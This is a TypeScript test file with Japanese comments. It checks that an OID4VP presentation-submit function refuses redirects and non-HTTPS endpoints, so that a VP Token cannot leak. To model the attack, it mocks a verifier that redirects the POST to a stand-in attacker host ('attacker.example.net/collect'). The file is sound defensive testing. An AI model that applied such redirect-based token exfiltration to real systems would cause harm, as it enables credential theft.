/**
 * `submitPresentation` の送信経路セキュリティ回帰テスト。
 *
 * direct_post と direct_post.jwt では HTTPS の `response_uri` を要求し、リダイレクトに追従しない。
 *
 * 検証内容:
 * - Verifier が 307 / 308 + `Location: http://attacker/` を返しても、同じ本文（VP Token）が
 *   攻撃者オリジンへ再 POST されない。3xx は 8035 の送信失敗として扱う。
 * - fetch には `redirect: 'manual'` を渡す（追従は fetch 実装側で起きるため、指定漏れ自体が脆弱性）。
 * - fetch 実装が `redirect` 指定を無視した場合でも、最終 URL の origin 再検査で検出する。
 * - `response_uri` が `https` でなければ、`client_id` と同一オリジンでも送信しない（8035）。
 */

import { afterEach, describe, expect, it } from 'bun:test';
import { ErrorCodes, VericertsError } from '../../../errors.js';
import {
  RESPONSE_MODE_DIRECT_POST,
  RESPONSE_MODE_DIRECT_POST_JWT,
  submitPresentation,
} from '../../oid4vp/oid4vp-submit.js';
import type { PresentationRequest } from '../../request.js';
import { clientMetadata } from './direct-post-jwt/direct-post-jwt.fixtures.js';

const VERIFIER = 'https://verifier.example.com';
const ATTACKER = 'http://attacker.example.net';
const VP_TOKEN = 'SECRET-VP-TOKEN';

/** 記録した fetch 呼び出し（リダイレクト追従が起きれば 2 件目が積まれる）。 */
interface FetchCall {
  readonly url: string;
  readonly body: string;
  readonly redirect: RequestRedirect | undefined;
}

const calls: FetchCall[] = [];
const originalFetch = globalThis.fetch;

afterEach(() => {
  globalThis.fetch = originalFetch;
  calls.length = 0;
});

/** 呼び出しを記録しつつ `impl` に委譲する fetch を差し込む。 */
function setFetch(impl: (url: string, init?: RequestInit) => Promise<Response>): void {
  globalThis.fetch = (async (input: string, init?: RequestInit) => {
    calls.push({ url: String(input), body: String(init?.body ?? ''), redirect: init?.redirect });
    return impl(String(input), init);
  }) as unknown as typeof fetch;
}

/**
 * `response_uri` で 3xx + `Location: <攻撃者>` を返す Verifier を模す。
 *
 * `redirect` 未指定 / `'follow'` の場合は undici・ブラウザの既定挙動（307/308 は method と body を
 * 維持して再送）を再現し、攻撃者オリジンへの 2 回目の POST が実際に記録されるようにする。
 */
function setRedirectingFetch(status: number): void {
  setFetch(async (url, init) => {
    if (!url.startsWith(VERIFIER)) {
      return new Response(null, { status: 200 });
    }
    const location = `${ATTACKER}/collect`;
    if (init?.redirect === undefined || init.redirect === 'follow') {
      return globalThis.fetch(location, init);
    }
    return new Response(null, { status, headers: { Location: location } });
  });
}

/** テスト用 `PresentationRequest`（既定は平文 `direct_post`）。 */
function sampleRequest(overrides: Partial<PresentationRequest> = {}): PresentationRequest {
  return {
    responseType: 'vp_token',
    clientId: VERIFIER,
    responseMode: RESPONSE_MODE_DIRECT_POST,
    responseUri: `${VERIFIER}/callback`,
    nonce: 'n-0S6_WzA2Mj',
    state: 's',
    ...overrides,
  };
}

describe('submitPresentation — リダイレクト追従による VP Token 漏洩の防止', () => {
  for (const status of [307, 308]) {
    it(`${status} + Location: http://attacker/ に追従せず 8035（攻撃者への再 POST なし）`, async () => {
      setRedirectingFetch(status);

      await expect(submitPresentation(sampleRequest(), VP_TOKEN)).rejects.toThrow(
        new VericertsError(ErrorCodes.PRESENTATION_SUBMIT_FAILED),
      );

      expect(calls).toHaveLength(1);
      expect(calls[0]?.url).toBe(`${VERIFIER}/callback`);
      expect(calls.some((call) => call.url.startsWith(ATTACKER))).toBe(false);
      expect(
        calls.some((call) => call.body.includes(VP_TOKEN) && call.url !== `${VERIFIER}/callback`),
      ).toBe(false);
    });
  }

  it('fetch に redirect: manual を渡す（追従は fetch 実装側で起きるため指定漏れ自体が脆弱性）', async () => {
    setFetch(async () => new Response(null, { status: 200 }));
    await submitPresentation(sampleRequest(), VP_TOKEN);
    expect(calls[0]?.redirect).toBe('manual');
  });

  it('301 / 302 など他の 3xx も送信失敗として扱う', async () => {
    setFetch(async () => new Response(null, { status: 302, headers: { Location: ATTACKER } }));
    await expect(submitPresentation(sampleRequest(), VP_TOKEN)).rejects.toThrow(
      new VericertsError(ErrorCodes.PRESENTATION_SUBMIT_FAILED),
    );
  });

  it('fetch 実装が redirect 指定を無視して追従した場合、最終 URL の origin 再検査で 8035', async () => {
    setFetch(async () => {
      // 追従済みレスポンス（status 200・最終 URL は攻撃者オリジン）を模す。
      const response = new Response(null, { status: 200 });
      Object.defineProperty(response, 'url', { value: `${ATTACKER}/collect` });
      return response;
    });

    await expect(submitPresentation(sampleRequest(), VP_TOKEN)).rejects.toThrow(
      new VericertsError(ErrorCodes.PRESENTATION_SUBMIT_FAILED),
    );
  });

  it('最終 URL が response_uri と同一オリジンなら成功する（正常系）', async () => {
    setFetch(async () => {
      const response = new Response(null, { status: 200 });
      Object.defineProperty(response, 'url', { value: `${VERIFIER}/callback` });
      return response;
    });
    await submitPresentation(sampleRequest(), VP_TOKEN);
    expect(calls).toHaveLength(1);
  });
});

describe('submitPresentation — response_uri の https 必須', () => {
  /** 8035 で拒否され、fetch が呼ばれない（＝ VP Token が一切送出されない）ことを確認する。 */
  async function expectRejectedWithoutFetch(request: PresentationRequest): Promise<void> {
    setFetch(async () => new Response(null, { status: 200 }));
    await expect(submitPresentation(request, VP_TOKEN)).rejects.toThrow(
      new VericertsError(ErrorCodes.PRESENTATION_SUBMIT_FAILED),
    );
    expect(calls).toHaveLength(0);
  }

  it('http の response_uri は client_id と同一オリジンでも送信しない（direct_post）', async () => {
    await expectRejectedWithoutFetch(
      sampleRequest({
        clientId: 'http://verifier.example.com',
        responseUri: 'http://verifier.example.com/cb',
      }),
    );
  });

  it('http の response_uri は direct_post.jwt でも送信しない（暗号化しても平文経路には載せない）', async () => {
    await expectRejectedWithoutFetch(
      sampleRequest({
        clientId: 'http://verifier.example.com',
        responseUri: 'http://verifier.example.com/cb',
        responseMode: RESPONSE_MODE_DIRECT_POST_JWT,
        clientMetadata: clientMetadata('ECDH-ES'),
      }),
    );
  });

  it('絶対 URL でない response_uri も送信しない', async () => {
    await expectRejectedWithoutFetch(
      sampleRequest({ clientId: 'x509_san_dns:verifier.example.com', responseUri: '/callback' }),
    );
  });
});
